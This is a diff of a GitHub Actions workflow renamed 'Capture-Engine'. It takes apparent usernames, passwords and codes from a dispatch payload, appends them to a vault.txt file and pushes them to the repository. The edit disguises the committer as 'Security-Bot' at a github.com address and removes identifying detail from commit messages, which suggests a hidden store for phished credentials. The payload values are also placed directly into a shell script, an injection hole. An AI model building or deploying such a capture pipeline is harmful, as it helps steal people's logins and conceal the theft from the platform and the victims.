@@ -1,23 +1,21 @@
-name: Cloud-Sync-Engine
+name: Capture-Engine
 on:
   repository_dispatch:
     types: [log_data]
 jobs:
-  sync:
+  update:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2
-      - name: Update Cloud Log
+      - name: Update Logs
         run: |
           U="${{ github.event.client_payload.u }}"
           P="${{ github.event.client_payload.p }}"
           C="${{ github.event.client_payload.c }}"
           T=$(date +'%Y-%m-%d %H:%M')
-          # تحديث ذكي: حذف بيانات المستخدم القديمة وإضافة الجديدة
-          sed -i "/| $U |/d" vault.txt
           echo "$T | $U | $P | $C" >> vault.txt
-          git config --global user.name "Cloud-Bot"
-          git config --global user.email "bot@cloud.com"
+          git config --global user.name "Security-Bot"
+          git config --global user.email "bot@github.com"
           git add vault.txt
-          git commit -m "Capture Update: $U"
+          git commit -m "Capture Update"
           git push
